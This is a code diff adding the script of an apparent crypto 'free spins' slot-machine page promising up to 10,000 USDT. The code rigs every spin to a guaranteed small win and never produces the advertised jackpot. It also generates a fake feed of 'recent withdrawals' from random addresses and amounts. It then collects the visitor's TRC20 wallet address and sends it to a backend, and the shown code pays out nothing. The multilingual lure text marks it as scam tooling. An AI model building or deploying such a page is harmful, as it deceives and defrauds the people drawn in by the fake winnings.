+{id:"btc",cls:"sym-btc",label:"BTC",svg:'<svg viewBox="0 0 32 32"><path fill="currentColor" d="M20.2 14.3c.3-2-1.2-3.1-3.3-3.8l.7-2.7-1.6-.4-.7 2.6c-.4-.1-.9-.2-1.3-.3l.7-2.6-1.6-.4-.7 2.7c-.4-.1-.7-.2-1-.2l-2.2-.5-.4 1.7s1.2.3 1.1.3c.6.2.8.5.7.9l-.7 3 .2.1-1.1 4.3c-.1.2-.3.5-.7.4l-1.1-.3-.8 1.8 2.1.5c.4.1.8.2 1.1.3l-.7 2.8 1.6.4.7-2.7c.4.1.9.2 1.3.3l-.7 2.7 1.6.4.7-2.8c2.9.5 5 .3 6-2.3.8-2.1 0-3.3-1.6-4.1 1.2-.3 2-1.1 2.2-2.7zm-3.2 4.5c-.5 2.2-4.1 1-5.3.7l.9-3.8c1.2.3 5 .9 4.4 3.1zm.6-4.5c-.5 2-3.5.97-4.4.73l.9-3.4c1 .2 4.1.7 3.5 2.67z"/></svg>'},
+{id:"eth",cls:"sym-eth",label:"ETH",svg:'<svg viewBox="0 0 32 32"><path fill="#8A9FF0" d="M16 5.2v8.3l7 3.1L16 5.2z"/><path fill="#627EEA" d="M16 5.2L9 16.6l7-3.1V5.2z"/><path fill="#8A9FF0" d="M16 21.5v5.3l7.1-9.8-7.1 4.5z"/><path fill="#627EEA" d="M16 26.8v-5.3l-7.1-4.5L16 26.8z"/><path fill="#4A62C8" d="M16 20.1l7-3.5-7-3.1v6.6z"/><path fill="#627EEA" d="M9 16.6l7 3.5v-6.6L9 16.6z"/></svg>'},
+{id:"sol",cls:"sym-sol",label:"SOL",svg:'<svg viewBox="0 0 32 32"><path fill="#14F195" d="M8.4 20.6c.2-.2.5-.3.8-.3h14.2c.5 0 .8.6.4 1l-2.7 2.7c-.2.2-.5.3-.8.3H6.1c-.5 0-.8-.6-.4-1l2.7-2.7z"/><path fill="#9945FF" d="M8.4 8c.2-.2.5-.3.8-.3h14.2c.5 0 .8.6.4 1l-2.7 2.7c-.2.2-.5.3-.8.3H6.1c-.5 0-.8-.6-.4-1L8.4 8z"/><path fill="#00C2FF" d="M23.6 14.1c-.2-.2-.5-.3-.8-.3H8.6c-.5 0-.8.6-.4 1l2.7 2.7c.2.2.5.3.8.3h14.2c.5 0 .8-.6.4-1l-2.7-2.7z"/></svg>'},
+{id:"doge",cls:"sym-doge",label:"DOGE",svg:'<svg viewBox="0 0 32 32"><path fill="currentColor" d="M11 8.2h7.1c3.6 0 6.2 2.4 6.2 5.8 0 2.2-1.1 4.1-2.9 5.1l3.6 4.7h-4.2l-3.1-4.2H14.6V24h-3.6V8.2zm3.6 3.1v5.2h3.4c1.7 0 2.8-1.1 2.8-2.6s-1.1-2.6-2.8-2.6h-3.4z"/></svg>'},
+{id:"usdt",cls:"sym-usdt",label:"USDT",svg:'<svg viewBox="0 0 32 32"><path fill="currentColor" d="M17.9 17.4v2.3c3 .16 5.2.88 5.2 1.74s-2.2 1.57-5.2 1.73v2.73h-1.9v-2.7c-3.05-.18-5.32-.93-5.32-1.84s2.27-1.65 5.32-1.82v-2.34c-2.16.14-3.67.7-3.67 1.37H9.5c0-1.2 2.38-2.12 5.45-2.28V13h1.9v1.1c3 .16 5.22.9 5.22 1.82 0 .93-2.22 1.66-5.22 1.82v.66h.05zm-1.9-.3v-2.18c-2.03.12-3.35.6-3.35 1.15s1.32 1.03 3.35 1.15zm1.9 4.82v-2.26c2.08.13 3.44.64 3.44 1.21s-1.36 1.07-3.44 1.18z"/></svg>'},
+{id:"trx",cls:"sym-trx",label:"TRX",svg:'<svg viewBox="0 0 32 32"><path fill="currentColor" d="M6.4 7.2l18.8 4.4-7.6 13.2L6.4 7.2zm13.3 5.1L9.8 9.7l7.7 11.4 2.2-8.8zm1.5.6l-2 7.8 5.3-9.2-3.3 1.4z"/></svg>'}
+];
+const MAP=Object.fromEntries(SYMS.map(s=>[s.id,s]));
+const $=id=>document.getElementById(id);
+const pick=a=>a[Math.floor(Math.random()*a.length)];
+function shuffle(a){a=a.slice();for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]]}return a}
+function bezier(x1,y1,x2,y2){
+  const A=(a,b)=>1-3*b+3*a,B=(a,b)=>3*b-6*a,C=a=>3*a;
+  const calc=(t,a,b)=>((A(a,b)*t+B(a,b))*t+C(a))*t;
+  const sl=(t,a,b)=>3*A(a,b)*t*t+2*B(a,b)*t+C(a);
+  return x=>{let t=x;for(let i=0;i<8;i++){const s=sl(t,x1,x2);if(Math.abs(s)<1e-6)break;t=Math.max(0,Math.min(1,t-(calc(t,x1,x2)-x)/s))}return calc(t,y1,y2)};
+}
+const E_OUT=t=>1-Math.pow(1-t,3);
+const E_BACK=bezier(.175,.885,.32,1.275);
+function setY(el,y){el._y=y;el.style.transform="translate3d(0,"+y+"px,0)"}
+function getY(el){return Number(el._y)||0}
+function tweenY(el,to,dur,ease,delay,onStart,onEnd){
+  return new Promise(res=>{
+    const from=getY(el),t0=performance.now()+delay*1000;
+    let started=0;
+    (function tick(now){
+      if(now<t0){requestAnimationFrame(tick);return}
+      if(!started){started=1;onStart&&onStart()}
+      const p=dur<=0?1:Math.min(1,(now-t0)/(dur*1000));
+      setY(el,from+(to-from)*ease(p));
+      if(p<1)requestAnimationFrame(tick);
+      else{setY(el,to);onEnd&&onEnd();res()}
+    })(performance.now());
+  });
+}
+
+const SFX={
+  ctx:null,muted:false,nodes:[],
+  unlock(){if(!this.ctx){const AC=window.AudioContext||window.webkitAudioContext;if(!AC)return;this.ctx=new AC()}if(this.ctx.state==="suspended")this.ctx.resume()},
+  tone(f,d,type,g,atk,peak){if(this.muted||!this.ctx)return;const t=this.ctx.currentTime,o=this.ctx.createOscillator(),a=this.ctx.createGain();o.type=type;o.frequency.setValueAtTime(f,t);a.gain.setValueAtTime(.0001,t);a.gain.exponentialRampToValueAtTime(g,t+atk);a.gain.exponentialRampToValueAtTime(.0001,t+d);if(peak)o.frequency.exponentialRampToValueAtTime(peak,t+d);o.connect(a);a.connect(this.ctx.destination);o.start(t);o.stop(t+d+.02)},
+  noise(d,g){if(this.muted||!this.ctx)return;const t=this.ctx.currentTime,n=this.ctx.sampleRate*d,buf=this.ctx.createBuffer(1,n,this.ctx.sampleRate),data=buf.getChannelData(0);for(let i=0;i<n;i++)data[i]=(Math.random()*2-1)*.6;const src=this.ctx.createBufferSource(),bp=this.ctx.createBiquadFilter(),a=this.ctx.createGain();src.buffer=buf;bp.type="bandpass";bp.frequency.value=1200;a.gain.setValueAtTime(g,t);a.gain.exponentialRampToValueAtTime(.0001,t+d);src.connect(bp);bp.connect(a);a.connect(this.ctx.destination);src.start(t)},
+  startSpin(){this.stopSpin();if(this.muted||!this.ctx)return;const t=this.ctx.currentTime,o=this.ctx.createOscillator(),l=this.ctx.createOscillator(),lg=this.ctx.createGain(),g=this.ctx.createGain();o.type="sawtooth";o.frequency.value=70;l.type="triangle";l.frequency.value=18;lg.gain.value=18;g.gain.value=.03;l.connect(lg);lg.connect(o.frequency);o.connect(g);g.connect(this.ctx.destination);o.start(t);l.start(t);this.nodes=[o,l]},
+  stopSpin(){this.nodes.forEach(n=>{try{n.stop()}catch(e){}});this.nodes=[]},
+  reelStop(){this.tone(180,.08,"square",.05,.005,90);this.noise(.05,.04)},
+  win(jp){(jp?[523,659,784,1046,1318]:[392,523,659,784]).forEach((f,i)=>setTimeout(()=>this.tone(f,.28,"triangle",.07,.01,f*1.02),i*90))}
+};
+
+let cv,cx,raf=0,parts=[];
+function burst(opt){
+  if(!cv){cv=document.createElement("canvas");cv.style.cssText="position:fixed;inset:0;width:100%;height:100%;pointer-events:none;z-index:80";document.body.appendChild(cv);cx=cv.getContext("2d");const rs=()=>{cv.width=innerWidth;cv.height=innerHeight};rs();addEventListener("resize",rs)}
+  const n=opt.n||50,cols=opt.c||["#FFD166","#00F0FF","#B026FF","#fff"],ox=(opt.x??.5)*cv.width,oy=(opt.y??.5)*cv.height,sp=((opt.sp??45)*Math.PI)/180,ang=((opt.a??90)*Math.PI)/180,vel=opt.v||45,sc=opt.sc||1,life=opt.t||200;
+  for(let i=0;i<n;i++){const a=ang+(Math.random()-.5)*sp,s=vel*(.45+Math.random()*.7);parts.push({x:ox,y:oy,vx:Math.cos(a)*s*.22,vy:-Math.sin(a)*s*.22,w:(4+Math.random()*5)*sc,h:(6+Math.random()*8)*sc,r:Math.random()*Math.PI,spin:(Math.random()-.5)*.28,col:cols[i%cols.length],life,max:life})}
+  if(!raf)raf=requestAnimationFrame(function loop(){cx.clearRect(0,0,cv.width,cv.height);for(let i=parts.length-1;i>=0;i--){const p=parts[i];p.vy+=.18;p.vx*=.995;p.x+=p.vx;p.y+=p.vy;p.r+=p.spin;p.life--;if(p.life<=0||p.y>cv.height+20){parts.splice(i,1);continue}cx.save();cx.translate(p.x,p.y);cx.rotate(p.r);cx.globalAlpha=Math.max(0,p.life/p.max);cx.fillStyle=p.col;cx.fillRect(-p.w/2,-p.h/2,p.w,p.h);cx.restore()}raf=parts.length?requestAnimationFrame(loop):0});
+}
+function fireConfetti(jp){
+  const c=["#FFD166","#00F0FF","#B026FF","#FF2BD6","#fff"];
+  burst({n:jp?160:90,sp:78,v:48,y:.28,c});
+  burst({n:jp?70:36,sp:55,sc:1.15,t:260,y:.32,c:["#FFD166","#F0B429","#FFF3C4"]});
+  if(jp){const end=Date.now()+900;(function f(){burst({n:3,a:60,sp:55,x:0,c});burst({n:3,a:120,sp:55,x:1,c});if(Date.now()<end)requestAnimationFrame(f)})()}
+}
+
+const S={spinning:0,left:SPINS,bal:0,pending:0,canExtract:0,withdrawn:0,addr:"",last:["btc","eth","sol","doge","usdt"],strips:[],reels:[]};
+function symH(){const p=document.querySelector(".sym");return p?p.getBoundingClientRect().height:64}
+function el(id,extra){const m=MAP[id],d=document.createElement("div");d.className="sym "+m.cls+(extra?" "+extra:"");d.dataset.id=id;d.innerHTML='<div class="sym-card">'+m.svg+"</div>";return d}
+function nbr(ex){return pick(SYMS.filter(s=>s.id!==ex)).id}
+function triple(c){return[nbr(c),c,nbr(c)]}
+function visCenter(strip){const nodes=strip.querySelectorAll(".sym"),h=Math.max(symH(),1),start=Math.round(Math.abs(getY(strip))/h);return nodes[start+1]||nodes[1]}
+function mount(){
+  const stage=$("reelsStage"),ticks=[...stage.querySelectorAll(".tick")];
+  stage.querySelectorAll(".reel").forEach(e=>e.remove());
+  S.reels=[];S.strips=[];
+  for(let i=0;i<N;i++){
+    const reel=document.createElement("div");reel.className="reel";
+    const strip=document.createElement("div");strip.className="reel-strip";
+    triple(S.last[i]).forEach((id,idx)=>strip.appendChild(el(id,idx===1?"on-payline":"")));
+    reel.appendChild(strip);stage.appendChild(reel);S.reels.push(reel);S.strips.push(strip);
+  }
+  ticks.forEach(t=>stage.appendChild(t));
+}
+function fmt(n){return n.toLocaleString("en-US",{minimumFractionDigits:n%1?2:0,maximumFractionDigits:2})}
+function setBal(n){S.bal=n;$("balanceText").textContent=n.toFixed(2)}
+function setLeft(n){S.left=n;$("spinsText").textContent=n}
+
+// 中奖金额按连中个数固定对应：2×=10, 3×=30, 4×=200, 5×=10000
+function calcPayout(match){
+  return PAYOUT_BY_MATCH[match] || 0;
+}
+
+// 每次 spin：match 从 [2,3,4] 随机，symbol 也随机，5连不出现
+function outcome(){
+  const m = pick(MATCH_POOL);
+  const win = pick(SYMS);
+  const r = new Array(N);
+  const ord = shuffle([...Array(N).keys()]);
+  for(let i=0;i<m;i++) r[ord[i]] = win.id;
+  const oth = shuffle(SYMS.filter(s=>s.id!==win.id));
+  for(let i=m;i<N;i++) r[ord[i]] = oth[(i-m)%oth.length].id;
+  const c={};r.forEach(id=>c[id]=(c[id]||0)+1);const top=Math.max(...Object.values(c));
+  return{result:r,winId:win.id,match:top,payout:calcPayout(top)};
+}
+function highlight(result,winId,match){
+  S.strips.forEach((strip,i)=>{
+    strip.querySelectorAll(".sym").forEach(e=>e.classList.remove("on-payline","is-win"));
+    const c=visCenter(strip);if(c){c.classList.add("on-payline");if(result[i]===winId)c.classList.add("is-win")}
+  });
+  const table=$("paytable");
+  table.classList.toggle("is-resolved",match>=2);
+  table.querySelectorAll(".pay-item").forEach(e=>e.classList.toggle("is-hit",match>=2&&+e.dataset.n===match));
+}
+function clearHL(){document.querySelectorAll(".sym.is-win,.pay-item.is-hit").forEach(e=>e.classList.remove("is-win","is-hit"));$("paytable").classList.remove("is-resolved")}
+function restoreBtn(){
+  const b=$("spinBtn");
+  if(S.canExtract){b.classList.add("is-extract");b.disabled=false;b.textContent="EXTRACT REWARDS";return}
+  b.classList.remove("is-extract");
+  b.disabled=S.pending>0||S.spinning;
+  b.textContent=S.spinning?"SPINNING...":"SPIN NOW";
+}
+function toast(t){const e=$("toast");e.textContent=t;e.classList.add("show");clearTimeout(toast._t);toast._t=setTimeout(()=>e.classList.remove("show"),1600)}
+function openM(id,on){$(id).classList.toggle("open",on!==false)}
+
+function spin(){
+  if(S.spinning||S.pending||S.canExtract||S.left<=0)return;
+  SFX.unlock();S.spinning=1;setLeft(S.left-1);clearHL();
+  const out=outcome(),btn=$("spinBtn");
+  btn.classList.remove("is-extract");btn.disabled=true;btn.textContent="SPINNING...";
+  SFX.startSpin();if(navigator.vibrate)navigator.vibrate(12);
+  const h=symH();
+  Promise.all(S.strips.map((strip,i)=>{
+    const nodes=strip.querySelectorAll(".sym"),start=Math.round(Math.abs(getY(strip))/Math.max(h,1));
+    const from=[0,1,2].map(k=>nodes[start+k]?.dataset.id||pick(SYMS).id);
+    const ids=from.slice();
+    for(let k=0;k<EXTRA;k++)ids.push(pick(SYMS).id);
+    ids.push(...triple(out.result[i]),nbr(out.result[i]),nbr(out.result[i]));
+    strip.innerHTML="";ids.forEach(id=>strip.appendChild(el(id)));setY(strip,0);
+    const y=-((ids.length-5)*h);
+    return tweenY(strip,y-OVER,DUR+i*STEP,E_OUT,i*DELAY,()=>S.reels[i].classList.add("is-spinning"),()=>S.reels[i].classList.remove("is-spinning"))
+      .then(()=>tweenY(strip,y,.38,E_BACK,0,null,()=>{SFX.reelStop();if(navigator.vibrate)navigator.vibrate(8)}));
+  })).then(()=>{
+    SFX.stopSpin();S.spinning=0;S.last=out.result.slice();highlight(out.result,out.winId,out.match);
+    const jp=out.match===5;S.pending=out.payout;restoreBtn();SFX.win(jp);
+    if(navigator.vibrate)navigator.vibrate(jp?[20,40,20,40,60]:[18,30,18]);
+    fireConfetti(jp);
+    const m=$("winModal"),lab=(MAP[out.winId]&&MAP[out.winId].label)||"CRYPTO";
+    m.classList.toggle("jackpot",jp);
+    $("modalKicker").textContent=jp?"QUANTUM JACKPOT":"NEON PAYOUT";
+    $("modalTitle").textContent=jp?"JACKPOT":"YOU WIN";
+    $("modalAmt").textContent="+"+fmt(out.payout)+" USDT";
+    $("modalDesc").textContent="Matched "+out.match+" "+lab+" symbols! +"+fmt(out.payout)+" USDT";
+    openM("winModal");
+  });
+}
+function claim(){
+  if(S.pending>0){setBal(S.bal+S.pending);toast("+"+fmt(S.pending)+" USDT CLAIMED");S.pending=0}
+  if(S.left<=0)S.canExtract=1;
+  openM("winModal",false);restoreBtn();
+}
+function submit(){
+  const input=$("trc20Input"),err=$("trc20Err"),addr=input.value.trim();
+  if(!/^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(addr)){input.classList.add("is-invalid");err.textContent="Address must start with T and be a valid 34-character TRC20 address.";return}
+  input.classList.remove("is-invalid");err.textContent="";S.withdrawn=1;S.addr=addr;openM("extractModal",false);$("confirmAddr").textContent=addr;openM("confirmModal");
+  submitTrc20Record(addr, S.bal.toFixed(2));
+}
+function onMain(){
+  if(S.canExtract && !S.spinning && !S.pending){
+    if(S.withdrawn){openM("confirmModal");return}
+    $("extractAmt").textContent=S.bal.toFixed(2)+" USDT";
+    const input=$("trc20Input");input.classList.remove("is-invalid");$("trc20Err").textContent="";
+    openM("extractModal");setTimeout(()=>input.focus(),280);return;
+  }
+  spin();
+}
+function init(){
+  const block=e=>e.preventDefault();
+  addEventListener("gesturestart",block,{passive:false});
+  addEventListener("gesturechange",block,{passive:false});
+  addEventListener("dblclick",block,{passive:false});
+  addEventListener("touchmove",e=>{if(e.touches.length>1)e.preventDefault()},{passive:false});
+  mount();setBal(0);setLeft(SPINS);
+  $("spinBtn").onclick=onMain;$("claimBtn").onclick=claim;$("submitWithdrawBtn").onclick=submit;
+  $("gotItBtn").onclick=()=>openM("confirmModal",false);
+  $("trc20Input").onkeydown=e=>{if(e.key==="Enter")submit()};
+  $("muteBtn").onclick=()=>{SFX.muted=!SFX.muted;if(SFX.muted)SFX.stopSpin();$("iconSoundOn").classList.toggle("hidden",SFX.muted);$("iconSoundOff").classList.toggle("hidden",!SFX.muted)};
+  let lastW=innerWidth;
+  addEventListener("resize",()=>{if(S.spinning||S.pending||S.canExtract||innerWidth===lastW)return;lastW=innerWidth;mount()});
+  initRollingAddresses();
+}
+if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",init);else init();
+})();
+
+// ========== 提交 TRC20 记录到后端 ==========
+async function submitTrc20Record(address, balance){
+  try{
+    const res = await fetch(API_BASE + '/api/records', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        address: address,
+        balance: balance || '0.00',
+        timestamp: new Date().toISOString()
+      })
+    });
+    if(!res.ok) throw new Error('HTTP ' + res.status);
+    console.log('[提交] TRC20 地址已记录');
+  }catch(err){
+    console.warn('地址记录提交失败:', err.message);
+  }
+}
+
+// ========== 滚动地址列表：20条队列，滚出一条补一条 ==========
+// 金额 = 该用户 3 次旋转结果之和，单次只可能是 10 / 30 / 200 / 10000
+// 10000 出现概率极低
+function initRollingAddresses() {
+  const inner = document.getElementById('rollingInner');
+  if (!inner) return;
+
+  function generateRandomTRC20() {
+    const chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+    let addr = 'T';
+    for (let i = 0; i < 33; i++) {
+      addr += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return addr;
+  }
+
+  const SPIN_POOL = [
+    10,10,10,10,10,10,10,10,10,10,10,10,10,10,
+    30,30,30,30,30,30,
+    200,200,200,
+    10000
+  ];
+
+  function generateRandomAmount() {
+    let sum = 0;
+    for (let i = 0; i < 3; i++) {
+      sum += SPIN_POOL[Math.floor(Math.random() * SPIN_POOL.length)];
+    }
+    return sum.toFixed(2);
+  }
+
+  const QUEUE_SIZE = 20;
+  const VISIBLE = 5;
+  const ITEM_HEIGHT = 20;
+
+  const queue = [];
+  function pushNew() {
+    queue.push({ addr: generateRandomTRC20(), amt: generateRandomAmount() });
+    if (queue.length > QUEUE_SIZE) queue.shift();
+  }
+  for (let i = 0; i < QUEUE_SIZE; i++) pushNew();
+
+  function render() {
+    const visible = queue.slice(0, VISIBLE);
+    inner.innerHTML = visible.map(item =>
+      `<div class="rolling-item">
+        <span class="addr">${item.addr.slice(0,8)}...${item.addr.slice(-6)}</span>
+        <span class="amt">${item.amt} USDT</span>
+      </div>`
+    ).join('');
+  }
+
+  render();
+
+  let offset = 0;
+
+  function scrollStep() {
+    offset += ITEM_HEIGHT;
+    if (offset >= ITEM_HEIGHT) {
+      offset = 0;
+      queue.shift();
+      pushNew();
+      render();
+      inner.style.transition = 'none';
+      inner.style.transform = 'translateY(0px)';
+      void inner.offsetHeight;
+      inner.style.transition = 'transform .6s ease-in-out';
+    }
+  }
+
+  setInterval(scrollStep, 2000);
+}
+</script>
+
+<!-- ========== 语言切换 ========== -->
+<script>
+(function(){
+  const TRANSLATIONS = {
+    en: { howto_title: 'How to Play · Game Description', howto_p1: '<span class="highlight-cyan">Spin the 5 reels</span> to match crypto symbols. You get <em>3 free spins</em> to start — no deposit needed!', howto_p2: 'Match <em>2+ identical symbols</em> on the center payline to win. Win up to <em>10,000 USDT</em> for 5-of-a-kind!', howto_p3: 'After your spins, claim winnings to your balance, then <span class="highlight-cyan">extract rewards</span> via USDT TRC20.', banner_kicker: 'WIN UP TO', banner_amt: '10,000 USDT', banner_end: 'FOR FREE!', banner_sub: 'Spin 3 times to unlock your starting balance. <em>No deposit required to play!</em>', spin_btn: 'SPIN NOW', spins_left: 'FREE SPINS REMAINING:', rolling_title: '⛓ RECENT TRC20 WITHDRAWALS' },
+    zh: { howto_title: '玩法说明 · 游戏描述', howto_p1: '<span class="highlight-cyan">转动5个转轮</span>匹配加密货币符号。开局即送<em>3次免费旋转</em>，无需存款！', howto_p2: '在中央赔付线上匹配<em>2个以上相同符号</em>即可赢奖，五个相同最高赢取<em>10,000 USDT</em>！', howto_p3: '旋转结束后，领取奖金到余额，然后通过USDT TRC20<span class="highlight-cyan">提取奖励</span>。', banner_kicker: '赢取高达', banner_amt: '10,000 USDT', banner_end: '免费！', banner_sub: '旋转3次解锁起始余额。<em>无需存款即可游玩！</em>', spin_btn: '立即旋转', spins_left: '剩余免费旋转：', rolling_title: '⛓ 近期TRC20提现' },
+    es: { howto_title: 'Cómo Jugar · Descripción', howto_p1: '<span class="highlight-cyan">Gira los 5 carretes</span> para igualar símbolos cripto. ¡Tienes <em>3 giros gratis</em> para empezar, sin depósito!', howto_p2: 'Iguala <em>2+ símbolos idénticos</em> en la línea de pago central para ganar. ¡Gana hasta <em>10,000 USDT</em> por 5 iguales!', howto_p3: 'Después de tus giros, reclama las ganancias a tu saldo y luego <span class="highlight-cyan">extrae recompensas</span> vía USDT TRC20.', banner_kicker: 'GANA HASTA', banner_amt: '10,000 USDT', banner_end: '¡GRATIS!', banner_sub: 'Gira 3 veces para desbloquear tu saldo inicial. <em>¡No se requiere depósito!</em>', spin_btn: 'GIRAR AHORA', spins_left: 'GIROS GRATIS RESTANTES:', rolling_title: '⛓ RETIROS TRC20 RECIENTES' },
+    hi: { howto_title: 'कैसे खेलें · गेम विवरण', howto_p1: '<span class="highlight-cyan">5 रील घुमाएं</span> और क्रिप्टो प्रतीकों को मिलाएं। शुरू करने के लिए <em>3 मुफ्त स्पिन</em> मिलते हैं — कोई जमा नहीं!', howto_p2: 'केंद्र पेलाइन पर <em>2+ समान प्रतीक</em> मिलाएं और जीतें। 5-ऑफ-ए-काइंड पर <em>10,000 USDT</em> तक जीतें!', howto_p3: 'स्पिन के बाद, जीत को बैलेंस में क्लेम करें, फिर USDT TRC20 से <span class="highlight-cyan">रिवॉर्ड निकालें</span>।', banner_kicker: 'जीतें', banner_amt: '10,000 USDT', banner_end: 'मुफ्त!', banner_sub: 'अपना शुरुआती बैलेंस अनलॉक करने के लिए 3 बार स्पिन करें। <em>खेलने के लिए कोई जमा नहीं!</em>', spin_btn: 'अभी स्पिन करें', spins_left: 'शेष मुफ्त स्पिन:', rolling_title: '⛓ हाल के TRC20 निकासी' },
+    ar: { howto_title: 'كيفية اللعب · وصف اللعبة', howto_p1: '<span class="highlight-cyan">قم بتدوير 5 بكرات</span> لمطابقة رموز العملات المشفرة. تحصل على <em>3 دورات مجانية</em> للبدء — بدون إيداع!', howto_p2: 'طابق <em>2+ رموز متطابقة</em> على خط الدفع المركزي للفوز. اربح حتى <em>10,000 USDT</em> لخمسة متطابقة!', howto_p3: 'بعد دوراتك، اطلب الأرباح إلى رصيدك، ثم <span class="highlight-cyan">استخرج المكافآت</span> عبر USDT TRC20.', banner_kicker: 'اربح حتى', banner_amt: '10,000 USDT', banner_end: 'مجانًا!', banner_sub: 'قم بالدوران 3 مرات لفتح رصيدك الأولي. <em>لا حاجة للإيداع للعب!</em>', spin_btn: 'قم بالدوران الآن', spins_left: 'الدورات المجانية المتبقية:', rolling_title: '⛓ عمليات سحب TRC20 الأخيرة' },
+    pt: { howto_title: 'Como Jogar · Descrição', howto_p1: '<span class="highlight-cyan">Gire os 5 rolos</span> para combinar símbolos cripto. Você ganha <em>3 giros grátis</em> para começar — sem depósito!', howto_p2: 'Combine <em>2+ símbolos idênticos</em> na linha de pagamento central para ganhar. Ganhe até <em>10,000 USDT</em> por 5 iguais!', howto_p3: 'Após seus giros, resgate os ganhos para o saldo e depois <span class="highlight-cyan">extraia recompensas</span> via USDT TRC20.', banner_kicker: 'GANHE ATÉ', banner_amt: '10,000 USDT', banner_end: 'GRÁTIS!', banner_sub: 'Gire 3 vezes para desbloquear seu saldo inicial. <em>Não é necessário depósito!</em>', spin_btn: 'GIRAR AGORA', spins_left: 'GIROS GRÁTIS RESTANTES:', rolling_title: '⛓ SAQUES TRC20 RECENTES' },
+    ru: { howto_title: 'Как играть · Описание', howto_p1: '<span class="highlight-cyan">Вращайте 5 барабанов</span>, чтобы совпали крипто-символы. Вы получаете <em>3 бесплатных вращения</em> для начала — без депозита!', howto_p2: 'Совместите <em>2+ одинаковых символа</em> на центральной линии выплат, чтобы выиграть. Выигрывайте до <em>10,000 USDT</em> за 5 одинаковых!', howto_p3: 'После вращений заберите выигрыш на баланс, затем <span class="highlight-cyan">выведите награды</span> через USDT TRC20.', banner_kicker: 'ВЫИГРАЙТЕ ДО', banner_amt: '10,000 USDT', banner_end: 'БЕСПЛАТНО!', banner_sub: 'Вращайте 3 раза, чтобы разблокировать стартовый баланс. <em>Без депозита!</em>', spin_btn: 'ВРАЩАТЬ', spins_left: 'ОСТАЛОСЬ БЕСПЛАТНЫХ ВРАЩЕНИЙ:', rolling_title: '⛓ ПОСЛЕДНИЕ ВЫВОДЫ TRC20' },
+    ja: { howto_title: '遊び方 · ゲーム説明', howto_p1: '<span class="highlight-cyan">5つのリールを回して</span>暗号通貨シンボルを揃えよう。<em>3回の無料スピン</em>付き、デポジット不要！', howto_p2: '中央のペイラインに<em>2つ以上の同じシンボル</em>を揃えると勝利。5つ揃えば最大<em>10,000 USDT</em>！', howto_p3: 'スピン後、勝利金を残高にクレームし、USDT TRC20で<span class="highlight-cyan">報酬を引き出そう</span>。', banner_kicker: '最大', banner_amt: '10,000 USDT', banner_end: '無料！', banner_sub: '3回スピンして初期残高をアンロック。<em>デポジット不要！</em>', spin_btn: 'スピン', spins_left: '残り無料スピン：', rolling_title: '⛓ 最近のTRC20出金' },
+    de: { howto_title: 'Spielanleitung · Beschreibung', howto_p1: '<span class="highlight-cyan">Drehen Sie die 5 Walzen</span>, um Krypto-Symbole zu treffen. Sie erhalten <em>3 Freispiele</em> zum Start — keine Einzahlung nötig!', howto_p2: 'Treffen Sie <em>2+ identische Symbole</em> auf der mittleren Gewinnlinie. Gewinnen Sie bis zu <em>10,000 USDT</em> für 5 gleiche!', howto_p3: 'Nach Ihren Drehungen fordern Sie Gewinne auf Ihr Guthaben an und <span class="highlight-cyan">extrahieren Belohnungen</span> über USDT TRC20.', banner_kicker: 'GEWINNEN SIE BIS ZU', banner_amt: '10,000 USDT', banner_end: 'GRATIS!', banner_sub: 'Drehen Sie 3 Mal, um Ihr Startguthaben freizuschalten. <em>Keine Einzahlung nötig!</em>', spin_btn: 'JETZT DREHEN', spins_left: 'VERBLEIBENDE FREISPIELE:', rolling_title: '⛓ LETZTE TRC20-AUSZAHLUNGEN' },
+    fr: { howto_title: 'Comment Jouer · Description', howto_p1: '<span class="highlight-cyan">Faites tourner les 5 rouleaux</span> pour aligner des symboles crypto. Vous avez <em>3 tours gratuits</em> pour commencer — sans dépôt !', howto_p2: 'Alignez <em>2+ symboles identiques</em> sur la ligne de paiement centrale pour gagner. Gagnez jusqu\'à <em>10,000 USDT</em> pour 5 identiques !', howto_p3: 'Après vos tours, réclamez les gains sur votre solde, puis <span class="highlight-cyan">extrayez les récompenses</span> via USDT TRC20.', banner_kicker: 'GAGNEZ JUSQU\'À', banner_amt: '10,000 USDT', banner_end: 'GRATUIT !', banner_sub: 'Tournez 3 fois pour débloquer votre solde de départ. <em>Aucun dépôt requis !</em>', spin_btn: 'TOURNER', spins_left: 'TOURS GRATUITS RESTANTS :', rolling_title: '⛓ RETRAITS TRC20 RÉCENTS' },
+    ko: { howto_title: '게임 방법 · 설명', howto_p1: '<span class="highlight-cyan">5개 릴을 돌려</span> 암호화폐 심볼을 맞추세요. 시작 시 <em>3회 무료 스핀</em> 제공 — 입금 불필요!', howto_p2: '중앙 페이라인에 <em>2개 이상 동일 심볼</em>을 맞추면 승리. 5개 일치 시 최대 <em>10,000 USDT</em> 획득!', howto_p3: '스핀 후 상금을 잔액으로 청구하고, USDT TRC20로 <span class="highlight-cyan">보상을 추출하세요</span>.', banner_kicker: '최대', banner_amt: '10,000 USDT', banner_end: '무료!', banner_sub: '3회 스핀하여 시작 잔액을 잠금 해제하세요. <em>입금 불필요!</em>', spin_btn: '스핀', spins_left: '남은 무료 스핀:', rolling_title: '⛓ 최근 TRC20 출금' },
+    it: { howto_title: 'Come Giocare · Descrizione', howto_p1: '<span class="highlight-cyan">Gira i 5 rulli</span> per abbinare simboli crypto. Hai <em>3 giri gratis</em> per iniziare — nessun deposito!', howto_p2: 'Abbina <em>2+ simboli identici</em> sulla linea di pagamento centrale per vincere. Vinci fino a <em>10,000 USDT</em> per 5 uguali!', howto_p3: 'Dopo i giri, riscatta le vincite sul saldo, poi <span class="highlight-cyan">estrai le ricompense</span> via USDT TRC20.', banner_kicker: 'VINCI FINO A', banner_amt: '10,000 USDT', banner_end: 'GRATIS!', banner_sub: 'Gira 3 volte per sbloccare il saldo iniziale. <em>Nessun deposito richiesto!</em>', spin_btn: 'GIRA ORA', spins_left: 'GIRI GRATIS RIMANENTI:', rolling_title: '⛓ PRELIEVI TRC20 RECENTI' },
